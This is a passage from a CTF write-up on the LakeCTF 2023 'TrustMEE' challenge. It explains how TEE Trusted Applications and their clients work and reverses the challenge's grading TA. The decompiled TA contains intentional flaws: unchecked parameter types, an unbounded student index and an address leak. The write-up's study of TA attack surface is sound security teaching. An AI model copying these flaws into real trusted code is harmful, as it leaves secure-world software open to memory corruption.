---
title: "Pwning a TEE Trusted Application - LakeCTF23"
date: 2023-12-31T00:00:01
tags:
  - pwn
  - ctf
  - lakeCTF
  - TEE
  - TA
  - environment setup
image: "/post-resources/TrustMEE/i-trusted-you-meme.jpg"
toc: true
summary: "A beginner-friendly guide to start pwning TAs from the REE."
---

Categories: Pwn

Description:
> the grades are stored securely in a trusted execution environment, maybe just learning for the course would have been easier...
>
> `nc chall.polygl0ts.ch 9002`
> 
> authors: LakeCTF 2023 organizers
>
> [Dockerfile](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/Dockerfile), [grade_ta.so](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/grade_ta.so), [grade_ca.c](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/grade_ca.c), [grade_ca.h](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/grade_ca.h), [run.sh](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/run.sh), [opentee.conf](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/opentee.conf), [exploit_template.py](https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/exploit_template.py)

---

## 1. Introduction

In this challenge, we are presented with a Trusted Application (TA) and our goal is to pwn it. We will write a Client Application (CA) that communicates with the TA through the OS and TEE environment. The focus of this writeup will be audience with no or little experience in TEE exploitation, TA development, and environment setup. We will assume that the reader has a high level understanding of what a TEE is but no knowledge of how a TA works or is implemented.

In this challenge, the TA is running inside [Open-TEE](https://open-tee.github.io/), which is an open-source project implementing a "virtual TEE" compliant with the recent GlobalPlatform TEE specifications. The GlobalPlatform TEE specifications are nothing more than just "specifications", i.e. they describes what APIs are available and their behavior for a TA and a CA to use. The implementation of those APIs is left to actual TEE implementation such as Open-TEE, OP-TEE, Teegris, etc and to kernel drivers.

With that said, one thing to clear out of the way is that [Open-TEE](https://open-tee.github.io/) and [OP-TEE](https://optee.readthedocs.io/en/latest/general/about.html) are two different things. Both are TEE implementations but their goal is different. Open-TEE is an emulation of an actual TEE, with the goal of facilitating developers and researchers to write TAs without any actual hardware. There is no real memory isolation mechanism in-place. The kernel and the TEE run with the same privileges. On the other hand, OP-TEE, is a TEE implementation designed as companion to a Linux kernel running on Arm; Cortex-A cores using the TrustZone technology. OP-TEE is designed primarily to rely on the Arm TrustZone technology as the underlying hardware isolation mechanism.

Although in this challenge the TA is not running under a real hardware-based TEE, the exploitation process remains the same. If you are interested in more about Open-TEE, you can optionally read its paper: [Open-TEE &mdash; An Open Virtual Trusted Execution Environment [paper]](https://arxiv.org/pdf/1506.07367.pdf).

## 2. Reversing the TA

In this challenge, we are not given the source code of the TA. Instead, we are just given the `grade_ta.so` binary.

![file](/post-resources/TrustMEE/file.png)

Fortunately, the binary is not stripped. So, let's load it into Ghidra. Here are the functions defined in this TA:

![functions](/post-resources/TrustMEE/functions.png)

But now what? There are a few things that we need to understand before we jump into reversing:

1. The structure of a TA
2. The lifecycle of a TA
3. How to communicate with a TA

## 3. Detour! TA crash course!

As an example TA implementation, we will use the [`digest_ta`](https://github.com/Open-TEE/TAs/blob/master/example_digest_ta) example provided by Open-TEE. This is a TA which you simply give a buffer as parameter and the TA calculates the hash for you. Of course there is no real meaning in such a TA to exist other than demonstration purposes.

The source code of the TA is found in [example_digest_ta.c](https://github.com/Open-TEE/TAs/blob/master/example_digest_ta/example_digest_ta.c). An example CA implementation is shown in [example_sha1_ca.c](https://github.com/Open-TEE/CAs/blob/master/example_sha1_ca/example_sha1_ca.c) which performs some SHA1 hashing.

The Open-TEE implements the version 1.0.26 of the GP Core API. Several items were raised to GP during the implementation of Open-TEE which resulted in the release of version 1.1.

**The TEE Internal Core API** is the API that is exposed to the TAs and can be found in [TEE Internal Core API v1.1](https://globalplatform.org/wp-content/uploads/2018/04/GPD_TEE_Internal_Core_API_Specification_v1.1.1_20160614.pdf). The **The TEE Client API** describes and defines how a CA running in the REE should communicate with TAs running in the TEE and can be bound in [TEE Client API v1.0](https://globalplatform.org/wp-content/uploads/2010/07/TEE_Client_API_Specification-V1.0.pdf).

### 3.1 TA Structure and Lifecycle

Trusted Applications are command-oriented. A CA opens a session with them and invokes commands within those sessions. TAs are uniquely identifiable by a UUID. That UUID is used by CAs to specify which TA they wish to communicate with. Let's examine the SHA1 example:

```c
/* UUID must be unique */
SET_TA_PROPERTIES(
  { 0x12345678, 0x8765, 0x4321, { 'D', 'I', 'G', 'E', 'S', 'T', '0', '0'} }, /* UUID */
    512, /* dataSize */
    255, /* stackSize */
    1, /* singletonInstance */
    1, /* multiSession */
    1) /* instanceKeepAlive */
```

First, some properties are defined for the TA. The UUID of this TA is `{ 0x12345678, 0x8765, 0x4321, { 'D', 'I', 'G', 'E', 'S', 'T', '0', '0'} },` which is of type `TEE_UUID`. Next, data sizes. Next, it defines that this is a single instance TA. Generally, TAs can be either **Multi-Instance** or **Single-Instance**. Multi-Instance means that each session opened by a client is directed to a separate TA instance, created on demand when the session is opened and destroyed when the session closes. Single-Instance on the other hand means that all sessions opened by the clients are directed to a single TA instance.

Next, the `multiSession` is set to enabled. This means that the TA can accept multiple concurrent sessions. This property only makes sense for Single-Instance TAs and for Multi-Instance TAs it is ignored. If `multiSession` is not enabled and the TA already has an active session, other CAs attempting to establish a session will fail.

Finally, `instanceKeepAlive` is set to enabled. This means that the TA instance will be preserved when there are no sessions connected to it.

Here is also the definition of the `SET_TA_PROPERTIES` macro and the struct holding the TA properties from the source code of Open-TEE:

```c
#define PROPERTY_SEC_NAME ".ta_properties"
#define SET_TA_PROPERTIES(...)                                                                     \
  struct gpd_ta_config ta_pro __attribute__((section(PROPERTY_SEC_NAME))) = { __VA_ARGS__ };

struct gpd_ta_config
{
  TEE_UUID appID;
  size_t dataSize;
  size_t stackSize;
  bool singletonInstance;
  bool multiSession;
  bool instanceKeepAlive;
};
```

As we can see, the TA properteis are stored in the `.ta_properties` section header. So, when we reverse our TA we should look for that section. Let's continue with analyzing the SHA1 example:

```c
/* Hash TA command IDs */
#define HASH_UPDATE    0x00000001
#define HASH_DO_FINAL  0x00000002
#define HASH_RESET     0x00000003

/* Hash algorithm identifier */
#define HASH_MD5  0x00000001
#define HASH_SHA1 0x00000002

TEE_Result TA_EXPORT TA_CreateEntryPoint(void)
{
  OT_LOG(LOG_ERR, "Calling the create entry point");
  return TEE_SUCCESS;
}

void TA_EXPORT TA_DestroyEntryPoint(void)
{
  OT_LOG(LOG_ERR, "Calling the Destroy entry point");
}

TEE_Result TA_EXPORT TA_OpenSessionEntryPoint(uint32_t paramTypes,
                TEE_Param params[4],
                void **sessionContext)
{
  algorithm_Identifier hash;
  /* ... Determine which hash algorithm to use based on parameters ... */
  return TEE_AllocateOperation((TEE_OperationHandle *)sessionContext, hash, TEE_MODE_DIGEST, 0);
}

void TA_EXPORT TA_CloseSessionEntryPoint(void *sessionContext)
{
  OT_LOG(LOG_ERR, "Calling the Close session entry point");
  TEE_FreeOperation(sessionContext);
}

TEE_Result TA_EXPORT TA_InvokeCommandEntryPoint(void *sessionContext,
            uint32_t commandID,
            uint32_t paramTypes,
            TEE_Param params[4])
{
  TEE_Result tee_rv = TEE_SUCCESS;
  /* ... Parse command and execute it ... */
  return tee_rv;
}
```

Let's focus on the following functions:

```c
TEE_Result TA_CreateEntryPoint(void);
void       TA_DestroyEntryPoint(void);
TEE_Result TA_OpenSessionEntryPoint(uint32_t paramTypes, TEE_Param params[4], void **sessionContext);
void       TA_CloseSessionEntryPoint(void *sessionContext);
TEE_Result TA_InvokeCommandEntryPoint(void *sessionContext, uint32_t commandID, uint32_t paramTypes, TEE_Param params[4]);
```

These functions are very similar to what we saw earlier in Ghidra:

![functions](/post-resources/TrustMEE/functions.png)

They represent the lifecycle of a TA. When a TA instance is created, the `TA_CreateEntryPoint` function is invoked &mdash; and when the instance is destroyed, `TA_DestroyEntryPoint` is invoked. Both functions are called only once in the lifetime of a TA instance.

When a client attempts to open a session with the TA, `TA_OpenSessionEntryPoint` is invoked. The client can pass up to 4 parameters to the TA when establishing the session. When the client releases the session, `TA_CloseSessionEntryPoint` is invoked. A **Session** is used to logically connect multiple commands invoked in a TA. Each session has its own state.

`TA_InvokeCommandEntryPoint` is invoked when the client invokes any command on the TA. A **Command** is issued within the context of a session and contains a Command Identifier, which is a 32-bit integer (`uint32_t commandID`), and four Operation Parameters, which can contain integer values or references to client-owned shared memory blocks (`uint32_t paramTypes, TEE_Param params[4]`) It is up to the TA to define the combinations of commands and their parameters that are valid to execute.

The above functions are called **Entry Points**. All Entry Point calls within a given TA instance are called in sequence, i.e. no more than one Entry Point is executed at any point in time. The Trusted Core Framework implementation guarantees that a commenced Entry Point call is completed before any new Entry Point call is allowed to begin execution. It is not possible to execute multiple concurrent commands within a session. The TEE guarantees that a pending command has completed before a new command is executed. Since all Entry Points of a given TA instance are called in sequence, **there is no need to use any dedicated synchronization mechanisms to maintain consistency of any TA instance memory**. The sequential execution of Entry Points inherently guarantees this consistency.

### 3.2 Client (REE) to TA (TEE) communication

Okay, now we know enough about TAs. Let's see how we can write a client to communicate with TAs. We will use the SHA1 example again:

```c
#include "tee_client_api.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const TEEC_UUID uuid = {
  0x12345678, 0x8765, 0x4321, { 'D', 'I', 'G', 'E', 'S', 'T', '0', '0'}
};

/* Data buffer sizes */
#define DATA_SIZE 256
#define SHA1_SIZE 20

/* Hash TA command IDs for this applet */
#define HASH_UPDATE 0x00000001
#define HASH_DO_FINAL 0x00000002
#define HASH_RESET 0x00000003

/* Hash algoithm */
#define HASH_MD5 0x00000001
#define HASH_SHA1 0x00000002

int main()
{
  TEEC_Context context;
  TEEC_Session session;
  TEEC_Operation operation;
  TEEC_SharedMemory in_mem;
  TEEC_SharedMemory out_mem;
  TEEC_Result tee_rv;
  char data[DATA_SIZE];
  uint8_t sha1[SHA1_SIZE];
  int i;

  printf("\nSTART: example SHA1 calc app\n");

  /* Initialize data stuctures */
  memset((void *)&in_mem, 0, sizeof(in_mem));
  memset((void *)&out_mem, 0, sizeof(out_mem));
  memset((void *)&operation, 0, sizeof(operation));
  memset(data, 'y', DATA_SIZE);
  memset(sha1, 0, SHA1_SIZE);

  /* Initialize context towards TEE */
  printf("Initializing context: ");
  tee_rv = TEEC_InitializeContext(NULL, &context);
  if (tee_rv != TEEC_SUCCESS) {
    printf("TEEC_InitializeContext failed: 0x%x\n", tee_rv);
    goto end_1;
  } else {
    printf("initialized\n");
  }

  /* Open session towards Digest TA by specifying the correct UUID */
  operation.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
  operation.params[0].value.a = HASH_SHA1; /* Open session is expecting HASH algorithm */

  printf("Openning session: ");
  tee_rv = TEEC_OpenSession(&context, &session, &uuid, TEEC_LOGIN_PUBLIC, NULL, &operation, NULL);
  if (tee_rv != TEEC_SUCCESS) {
    printf("TEEC_OpenSession failed: 0x%x\n", tee_rv);
    goto end_2;
  } else {
    printf("opened\n");
  }

    /* Memory management and TEEC_InvokeCommand() */

    /* Cleanup used connection/resources */
end_4:
  printf("Releasing shared out memory..\n");
  TEEC_ReleaseSharedMemory(&out_mem);
end_3:
  printf("Releasing shared in memory..\n");
  TEEC_ReleaseSharedMemory(&in_mem);
  printf("Closing session..\n");
  TEEC_CloseSession(&session);
end_2:
  printf("Finalizing ctx..\n");
  TEEC_FinalizeContext(&context);
end_1:
  printf("END: example SHA1 calc app\n\n");
  exit(tee_rv);
}
```

The Entry Point functions that we mentioned in the TAs API are 1-to-1 mapped to functions available to clients through the client API:

```c
TA_OpenSessionEntryPoint   <-> TEEC_OpenSession
TA_CloseSessionEntryPoint  <-> TEEC_CloseSession
TA_InvokeCommandEntryPoint <-> TEEC_InvokeCommand
```

The Entry Points `TA_CreateEntryPoint` and `TA_DestroyEntryPoint` do not directly map to any client API. This is because when `TEEC_OpenSession` is invoked, a TA instance will be created if no TA instance exists.

You might stumble upon on some other functions, such as `TEE_OpenTASession`, `TEE_InvokeTACommand`, or `TEE_CloseTASession`. These are APIs available within the TEE only. Generally, the prefix `TEE_` is used for APIs inside the TEE and the prefix `TEEC_` for APIs available to clients that are running in the REE. The reason that the `TEE_OpenTASession`, `TEE_InvokeTACommand`, and `TEE_CloseTASession` functions exist is that TA-to-TA communication is also possible and takes place entirely within the TEE. However, TA-to-TA communication is not something we will deepen any further here.

### 3.3 Parameters and TA commands

Great! At this point we know:

1. The structure of a TA
2. The lifecycle of the TA
3. How to communicate with the TA

However, there is one important thing left to cover. And that is parameters passed from the client to the TA. Since our goal is to exploit a TA, our attack surface is more or less the parameters and commands that the TA expects. Let's focus on the `TA_OpenSessionEntryPoint` and `TA_InvokeCommandEntryPoint` implemented by the digest example TA:

```c
TEE_Result TA_EXPORT TA_OpenSessionEntryPoint(uint32_t paramTypes, TEE_Param params[4], void **sessionContext)
{
  algorithm_Identifier hash;

  OT_LOG(LOG_ERR, "Calling the Open session entry point");
  if (TEE_PARAM_TYPE_GET(paramTypes, 0) != TEE_PARAM_TYPE_VALUE_INPUT) {
    OT_LOG(LOG_ERR, "Bad parameter at index 0: expexted value input");
    return TEE_ERROR_BAD_PARAMETERS;
  }

  switch (params[0].value.a) {
  case HASH_MD5:
    hash = TEE_ALG_MD5;
    break;
  case HASH_SHA1:
    hash = TEE_ALG_SHA1;
    break;
  default:
    OT_LOG(LOG_ERR, "Unknow hash algorithm");
    return TEE_ERROR_BAD_PARAMETERS;
  }
  return TEE_AllocateOperation((TEE_OperationHandle *)sessionContext, hash, TEE_MODE_DIGEST, 0);
}

TEE_Result TA_EXPORT TA_InvokeCommandEntryPoint(void *sessionContext,
            uint32_t commandID,
            uint32_t paramTypes,
            TEE_Param params[4])
{
  TEE_Result tee_rv = TEE_SUCCESS;

  OT_LOG(LOG_ERR, "Calling the Invoke command entry point");

  if (commandID == HASH_RESET) {
    TEE_ResetOperation(sessionContext);
  } else if (commandID == HASH_UPDATE) {
    if (TEE_PARAM_TYPE_GET(paramTypes, 0) != TEE_PARAM_TYPE_MEMREF_INPUT) {
      OT_LOG(LOG_ERR, "Bad parameter at index 0: expexted memory input");
      return TEE_ERROR_BAD_PARAMETERS;
    }
    TEE_DigestUpdate(sessionContext, params[0].memref.buffer, params[0].memref.size);
  } else if (commandID == HASH_DO_FINAL) {

    if (TEE_PARAM_TYPE_GET(paramTypes, 0) != TEE_PARAM_TYPE_NONE &&
        TEE_PARAM_TYPE_GET(paramTypes, 0) != TEE_PARAM_TYPE_MEMREF_INPUT) {
      OT_LOG(LOG_ERR, "Bad parameter at index 0: expexted memory input");
      return TEE_ERROR_BAD_PARAMETERS;
    }
    if (TEE_PARAM_TYPE_GET(paramTypes, 1) != TEE_PARAM_TYPE_MEMREF_OUTPUT) {
      OT_LOG(LOG_ERR, "Bad parameter at index 1: expexted memory output");
      return TEE_ERROR_BAD_PARAMETERS;
    }
    tee_rv = TEE_DigestDoFinal(sessionContext, params[0].memref.buffer,
        params[0].memref.size, params[1].memref.buffer,
        &params[1].memref.size);

  } else {
    OT_LOG(LOG_ERR, "Unknow command ID");
    tee_rv = TEE_ERROR_BAD_PARAMETERS;
  }

  return tee_rv;
}
```

When a Client opens a session on a TA or invokes a command, the client can send **Operation Parameters** to the TA. The parameters encode the data associated with the operation. Up to four parameters can be sent in an operation. Each parameter can be individually typed by the Client as a **Value Parameter**, or a **Memory Reference Parameter**. Each parameter is also tagged with a direction of data flow (input, output, or both input and output).

**Value Parameters** carry two 32-bit integers (`TEEC_Value`).

**Memory Reference Parameters**, carry a pointer to a client-owned memory buffer (`TEEC_RegisteredMemoryReference` or `TEEC_TempMemoryReference`). (For output Memory References, there is a built-in mechanism for the TAs to report the necessary size of the buffer in case of a too-short buffer.) Note that Memory Reference Parameters typically point to **memory owned by the client and shared with the TA** for the duration of the operation. This is especially useful in the case of REE Clients to minimize the number of memory copies and the data footprint in case a TA needs to deal with large data buffers. However, it can also have security implications as the memory is shared between the client running in the REE and the TA running in the TEE!

**A rogue client may well change the content of the shared memory buffer at any time, even between two consecutive memory accesses by the TA. This means that the TA needs to be carefully written to avoid any security problem if this happens and deal with TOCTOU vulnerabilities that may arise because of this. If values in the buffer are security critical, the TA should always read data only once from a shared buffer and then validate it. It must not assume that data written to the buffer can be read unchanged later on. The data should be copied to a TA instance-owned buffer.**


```c
// TEEC_Operation Defines the payload of either an open session or invoke command
typedef struct {
  uint32_t started;    /*!< Must set to zero if the client may try to cancel the operation */
  uint32_t paramTypes; /*!< Encodes the type of each parameter that is being transferred */
  TEEC_Parameter params[4]; /*!< an array of 4 possible paramaters to share with TA */
  void *imp; //implementation defined
} TEEC_Operation;

typedef union {
  TEEC_TempMemoryReference tmpref;
  TEEC_RegisteredMemoryReference memref;
  TEEC_Value value;
} TEEC_Parameter;

// Value Parameter
typedef struct {
  uint32_t a;
  uint32_t b;
} TEEC_Value;

// Uses a pre-registered memory or pre-allocated memory block
typedef struct {
  TEEC_SharedMemory *parent; /*!< Either a whole or partial memory reference */
  size_t size;               /*!< The size of the referenced memory region, in bytes */
  size_t offset;             /*!< The offset in bytes of the referenced memory region */
} TEEC_RegisteredMemoryReference;

// A Temporary memory Reference
typedef struct {
  void *buffer; /*!< Pointer to the first byte of a buffer that needs to be referenced */
  size_t size;  /*!< Size of the referenced memory region */
} TEEC_TempMemoryReference;
```

Memory References can be either a **Registered Memory Reference** or a **Temporary Memory Reference**.

A **Registered Memory Reference** is a region within a block of Shared Memory that was created before the (open session or invoke command) operation.

A **Temporary Memory Reference** directly specifies a buffer of memory owned by the CA, which is temporarily registered by the TEE Client API for the duration of the operation being performed.

Generally, a **Memory Reference** is a range of bytes which is actually shared (between the CA and TA) for a particular operation. A Memory Reference is described by either a `TEEC_MemoryReference` or `TEEC_TempMemoryReference` structure as shown above. It can specify either:

* A whole Shared Memory block. (`TEEC_MemoryReference`)
* A range of bytes within a Shared Memory block. (`TEEC_MemoryReference`)
* A pointer to a buffer of memory owned by the client, in which case this buffer is temporarily registered for the duration of the operation (`TEEC_TempMemoryReference`)

The Memory Reference also specifies the direction in which data flows as it can be marked as input (client-to-TA), output (TA-to-client), or both.

A **Shared Memory** block is a region of memory allocated in the context of the client memory space that can be used to transfer data between that CA and a TA. A  Shared Memory block can either be existing CA memory which is subsequently registered with the TEE Client API, or memory which is allocated on behalf of the CA using the TEE Client API. A Shared Memory block can be registered or allocated once and then used multiple times such as in multiple commands, and even in multiple Sessions, provided they exist within the scope of the TEE Context in which the Shared Memory was created. Overlapping Shared memory registrations are allowed and a single region of client memory may be registered multiple times.


```c
// A shared memory block that has been registered or allocated
typedef struct {
  void *buffer;   /*!< pointer to a memory buffer that is shared with TEE */
  size_t size;    /*!< The size of the memory buffer in bytes */
  uint32_t flags; /*!< bit vector that can contain TEEC_MEM_INPUT or TEEC_MEM_OUTPUT or both */
  void *imp;      // implementation defined
} TEEC_SharedMemory;
```
 
![Shared Memory Buffer Lifetime](/post-resources/TrustMEE/shared-memory-buffer-lifetime.png)

With all that said, let's see how the SHA1 client now communicates with the digest TA:

```c
int main()
{
  TEEC_Context context;
  TEEC_Session session;
  TEEC_Operation operation;
  TEEC_SharedMemory in_mem;
  TEEC_SharedMemory out_mem;
  TEEC_Result tee_rv;
  char data[DATA_SIZE];
  uint8_t sha1[SHA1_SIZE];
  int i;

  printf("\nSTART: example SHA1 calc app\n");
  /* ... Initialize data stuctures ... */
  /* ... Initialize context towards TEE using TEEC_InitializeContext() ... */

  /* Open session towards Digest TA by specifying the correct UUID */
  operation.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
  operation.params[0].value.a = HASH_SHA1; /* Open session is expecting HASH algorithm */

  printf("Openning session: ");
  tee_rv = TEEC_OpenSession(&context, &session, &uuid, TEEC_LOGIN_PUBLIC, NULL, &operation, NULL);
  if (tee_rv != TEEC_SUCCESS) {
    printf("TEEC_OpenSession failed: 0x%x\n", tee_rv);
    goto end_2;
  } else {
    printf("opened\n");
  }

  /* Register shared memory for input */
  in_mem.buffer = data;
  in_mem.size = DATA_SIZE;
  in_mem.flags = TEEC_MEM_INPUT;
  tee_rv = TEEC_RegisterSharedMemory(&context, &in_mem);
  if (tee_rv != TEE_SUCCESS) {
    printf("Failed to register DATA shared memory\n");
    goto end_3;
  }
  printf("Registered in mem..\n");

  /* Invoke command from digest TA */
  operation.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE, TEEC_NONE, TEEC_NONE);
  operation.params[0].memref.parent = &in_mem;

  printf("Invoking command: Update sha1: ");
  tee_rv = TEEC_InvokeCommand(&session, HASH_UPDATE, &operation, NULL);
  if (tee_rv != TEEC_SUCCESS) {
    printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
    goto end_3;
  } else {
    printf("done\n");
  }

  /* Register shared memory for output */
  out_mem.buffer = sha1;
  out_mem.size = SHA1_SIZE;
  out_mem.flags = TEEC_MEM_OUTPUT;
  tee_rv = TEEC_RegisterSharedMemory(&context, &out_mem);
  if (tee_rv != TEE_SUCCESS) {
    printf("Failed to allocate SHA1 shared memory\n");
    goto end_3;
  }
  printf("Registered out mem..\n");

  /* Invoke second time from digest TA:
   * Send some more data to calculate the hash over, this will be added to the original hash.
   * This is not strictly needed it is a test for passing 2 memref params in a single
   * operation
   */
  memset(data, 'Z', DATA_SIZE);
  operation.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_MEMREF_WHOLE, TEEC_NONE, TEEC_NONE);

  /*
   * reuse the original input shared memory, because we have just updated the contents
   * of the buffer
   */
  operation.params[0].memref.parent = &in_mem;
  operation.params[1].memref.parent = &out_mem;

  printf("Invoking command: Do final sha1: ");
  tee_rv = TEEC_InvokeCommand(&session, HASH_DO_FINAL, &operation, NULL);
  if (tee_rv != TEEC_SUCCESS) {
    printf("TEEC_InvokeCommand failed: 0x%x\n", tee_rv);
    goto end_4;
  } else {
    printf("done\n");
  }

  printf("Calculated sha1: ");
  for (i = 0; i < SHA1_SIZE; i++)
    printf("%02x", sha1[i]);
  printf("\n");

    /* ... Cleanup used connection/resources ... */
  exit(tee_rv);
}
```

### 3.4 Security considerations

So, with all that said, what can go wrong with TAs?

* Global variables. Global variables have the same lifetime as the lifetime of a TA instance and can be accessed between multiple sessions and commands. This can lead to state confusion bugs.
* To determine whether a given buffer is a Memory Reference or a buffer owned by the TA itself, the function `TEE_CheckMemoryAccessRights` can be used.
* The `uint32_t paramTypes` should always be checked against what the TA expects before accessing the parameters themselves (`TEE_Param params[4])`. Otherwise, vulnerabilities can occur such as type confusion leading to RCE within the TA.
* TOCTOU vulnerabilities can occur as Memory Reference parameters refer to Shared Memory between the client (REE) and the TA (TEE).


## 4. Reversing revisited!

So, with our understanding of TAs now, let's reverse `grade_ta.so`. Let's first look at the properties of the TA:

![ta-properties.png](/post-resources/TrustMEE/ta-properties.png)

It is good to know its UUID, that it is a Single Instance and that it allows multiple sessions. Next, we reverse engineer the Entry Point functions, i.e.:

```c
TA_CreateEntryPoint
TA_DestroyEntryPoint
TA_OpenSessionEntryPoint
TA_CloseSessionEntryPoint
TA_InvokeCommandEntryPoint
```

Since we have the source code of Open-TEE, we can create a [helper header](https://github.com/nikosChalk/ctf-writeups/blob/master/lakeCTF23/pwn/trustMEE/solution/opentee-helper.h) for Ghidra to parse and have all the data type declarations available. After some reversing, here is the final decompilation of `grade_ta.so`:

```c
TEE_Result TA_CreateEntryPoint(void) {
  return 0;
}
void TA_DestroyEntryPoint(void) {
  return;
}

char[256] GRADE_KEY;
TEE_Result TA_OpenSessionEntryPoint(uint32_t paramTypes,TEE_Param *params,void **sessionContext) {

  for(int i=0; i<256; i++)
    GRADE_KEY[i] = getRandomByte();
  return TEE_AllocateOperation(sessionContext,TEE_ALG_MD5,TEE_MODE_DIGEST,0);
}
void TA_CloseSessionEntryPoint(void *sessionContext) {
  return;
}

TEE_Result TA_InvokeCommandEntryPoint(void *sessionContext,uint32_t commandID,uint32_t paramTypes,TEE_Param *params) {
  TEE_Result TVar1;
  signedStudent *curSignedStudent;
  student *curStudent;
  undefined8 lineno;
  student *studentArray;
  student *student2;
  signedStudent *end;
  uint32_t idx;
  student *student1;
  size_t sz;

  /* Assignments to `lineno` variable have been omitted */
  
  /* SIGN_CLASS */
  if (commandID == SIGN_CLASS) {
    curStudent = (student *)(params->memref).buffer;
    curSignedStudent = (signedStudent *)params[1].memref.buffer;
    sz = params[1].memref.size;
    TVar1 = TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER, curStudent,(params->memref).size);
    if (TVar1 == TEE_SUCCESS) {
      TVar1 = TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER,curSignedStudent,sz);
      end = curSignedStudent + NR_STUDENTS;
      if (TVar1 == TEE_SUCCESS) {
        while( true ) {
          TEE_MemMove(curSignedStudent,curStudent,0x10);
          TEE_MemMove(curSignedStudent->lastname,curStudent->lastname,0x10);
          curSignedStudent->grade = curStudent->grade;
          curSignedStudent->sciper = curStudent->sciper;
          TVar1 = calculate_signature(sessionContext,curSignedStudent);
          if (TVar1 != TEE_SUCCESS) break;
          curSignedStudent = curSignedStudent + 1;
          curStudent = curStudent + 1;
          if (curSignedStudent == end) {
            return TEE_SUCCESS;
          }
        }
        goto LAB_001014fa;
      }
    }
  }
  else {
    if (commandID != SIGN_STUDENT) {
      if (commandID != SIGN_CLASS_STUDENT) {
        return TEE_ERROR_BAD_PARAMETERS;
      }
      
      /* SIGN_CLASS_STUDENT */
      studentArray = (student *)(params->memref).buffer;
      curSignedStudent = (signedStudent *)params[1].memref.buffer;
      sz = params[1].memref.size;
      idx = params[2].value.a;
      TVar1 = TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER, studentArray,(params->memref).size);
      if (TVar1 == TEE_SUCCESS) {
        TVar1 = TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER, curSignedStudent,sz);
        if (TVar1 == TEE_SUCCESS) {
          student1 = studentArray + (int)idx;
          TEE_MemMove(curSignedStudent,student1,0x10);
          TEE_MemMove(curSignedStudent->lastname,studentArray[(int)idx].lastname,0x10);
          curSignedStudent->grade = student1->grade;
          curSignedStudent->sciper = student1->sciper;
          TVar1 = calculate_signature(sessionContext,curSignedStudent);
          if (TVar1 == TEE_SUCCESS) {
            return TEE_SUCCESS;
          }
          goto LAB_001014fa;
        }
      }
      __syslog_chk(3,1,"%s:%s:%d  Bad Parameters!","../../TAs/vuln_ta/vuln_ta.c", "TA_InvokeCommandEntryPoint",lineno);
      return TEE_ERROR_BAD_PARAMETERS;
    }
    
    /* SIGN_STUDENT */
    student2 = (student *)(params->memref).buffer;
    curSignedStudent = (signedStudent *)params[1].memref.buffer;
    sz = params[1].memref.size;
    TVar1 = TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER, student2,(params->memref).size);
    if (TVar1 == TEE_SUCCESS) {
      TVar1 = TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER, curSignedStudent,sz);
      if (TVar1 == TEE_SUCCESS) {
        TEE_MemMove(curSignedStudent,student2,0x10);
        TEE_MemMove(curSignedStudent->lastname,student2->lastname,0x10);
        curSignedStudent->grade = student2->grade;
        curSignedStudent->sciper = student2->sciper;
        TVar1 = calculate_signature(sessionContext,curSignedStudent);
        if (TVar1 == TEE_SUCCESS) {
          return TEE_SUCCESS;
        }
LAB_001014fa:
        __syslog_chk(3,1,"%s:%s:%d  Signature Calculation Failed!","../../TAs/vuln_ta/vuln_ta.c", "TA_InvokeCommandEntryPoint",lineno);
        return TVar1;
      }
    }
  }
  __syslog_chk(3,1,"%s:%s:%d  Bad Parameters!","../../TAs/vuln_ta/vuln_ta.c", "TA_InvokeCommandEntryPoint",lineno);
  return TEE_ERROR_BAD_PARAMETERS;
}

TEE_Result calculate_signature(void *sessionContext,signedStudent *signedStudent) {
  TEE_Result TVar1;
  long in_FS_OFFSET;
  size_t local_50;
  undefined hash [24];
  long local_30;
  
  TVar1 = TEE_ERROR_SECURITY;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if (signedStudent->grade - 1U < 6) {
    TEE_DigestUpdate(sessionContext,signedStudent,0x10);
    TEE_DigestUpdate(sessionContext,signedStudent->lastname,0x10);
    TEE_DigestUpdate(sessionContext,&signedStudent->grade,4);
    TEE_DigestUpdate(sessionContext,GRADE_KEY,0x100);
    local_50 = 0x10;
    printf("address of sig %p\n");
    TVar1 = TEE_DigestDoFinal(sessionContext,(void *)0x0,0,hash,&local_50);
    printf("hash: %s\n",hash);
    TEE_MemMove(signedStudent->signature,hash,(uint32_t)local_50);
    printf("hash length: %d\n",local_50);
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    //stack canary check
    return TVar1;
  }
  __stack_chk_fail();
}
```

The main takeaways are:

* `TA_OpenSessionEntryPoint` initializes some array with random data and prepares the TA for MD5 hashing
* `TA_InvokeCommandEntryPoint` accepts 3 commands:
  * `SIGN_CLASS`. This command signs a whole class of students, i.e. `NR_STUDENTS` students.
    * `params[0]` is a Memory Reference to `struct student`
